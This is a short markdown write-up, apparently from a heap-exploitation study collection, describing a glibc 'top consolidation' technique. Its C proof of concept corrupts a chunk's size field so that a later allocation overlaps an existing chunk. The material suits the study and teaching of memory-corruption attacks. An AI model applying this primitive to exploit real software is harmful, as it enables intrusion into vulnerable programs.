## top consolidation

**Purpose:** We can have two separate chunks allocated to the same space, no need heap leak (no need to create fake main_arena)

**Require:** Have an ability to change the metadata of the allocated chunks

## POC

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    long *chunk0, *chunk1, *chunk2, *chunk3;

    chunk0 = malloc(0x420);
    chunk1 = malloc(0x80);

    /* VULN HERE */
    chunk0[-1] = ((0x420 + 0x10) + (0x80 + 0x10)) + 0x1; // Extend the size of chunk0 to include chunk1
    /* VULN HERE */

    free(chunk0); // Consolidate

    chunk2 = malloc(0x420); // Can padding depend on purpose
    chunk3 = malloc(0x80); // This should be the same as chunk1

    assert(chunk1 == chunk3); // If we can allocate the same chunk again, we win!
}
```
